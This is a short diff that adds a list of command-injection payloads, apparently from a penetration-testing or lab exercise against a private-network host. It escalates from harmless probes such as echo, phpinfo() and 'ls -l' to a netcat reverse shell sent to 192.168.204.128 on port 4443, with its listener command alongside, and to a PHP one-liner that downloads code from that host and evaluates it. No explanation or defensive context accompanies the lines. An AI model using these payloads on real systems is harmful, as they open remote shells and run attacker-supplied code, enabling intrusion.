@@ -1,0 +1,7 @@
+;
+; echo "something"
+; phpinfo()
+; system("ls -l")
+; system("which nc")
+; system("/bin/nc -e /bin/sh 192.168.204.128 4443")  (nc -nlvp 4443)
+; system("php -d allow_url_fopen=true -r \"eval(file_get_contents('http://192.168.204.128:8081/lLmrJ0AIvyv'));\"")
